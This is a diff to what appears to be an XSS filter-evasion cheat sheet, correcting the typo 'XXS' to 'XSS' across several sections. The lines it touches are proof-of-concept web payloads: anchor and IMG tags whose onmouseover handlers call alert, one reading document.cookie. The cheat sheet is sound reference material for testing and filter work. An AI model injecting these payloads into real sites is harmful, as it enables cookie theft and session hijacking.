@@ -61,13 +61,13 @@ If you need to use both double and single quotes you can use a grave accent to e
 
 ## Malformed A Tags
 
-Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross \~ Verified on Chrome
+Skip the HREF attribute and get to the meat of the XSS... Submitted by David Cross \~ Verified on Chrome
 
-`\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`
+`\<a onmouseover="alert(document.cookie)"\>xss link\</a\>`
 
 or Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script.
 
-`\<a onmouseover=alert(document.cookie)\>xxs link\</a\>`
+`\<a onmouseover=alert(document.cookie)\>xss link\</a\>`
 
 ## Malformed IMG Tags
 
@@ -87,15 +87,15 @@ This will bypass most SRC domain filters. Inserting javascript in an event metho
 
 Edited by Abdullah Hussam(@Abdulahhusam).
 
-`<IMG SRC=# onmouseover="alert('xxs')">`
+`<IMG SRC=# onmouseover="alert('xss')">`
 
 ## Default SRC Tag by Leaving it Empty
 
-`<IMG SRC= onmouseover="alert('xxs')">`
+`<IMG SRC= onmouseover="alert('xss')">`
 
 ## Default SRC Tag by Leaving it out Entirely
 
-`<IMG onmouseover="alert('xxs')">`
+`<IMG onmouseover="alert('xss')">`
 
 ## On Error Alert
 
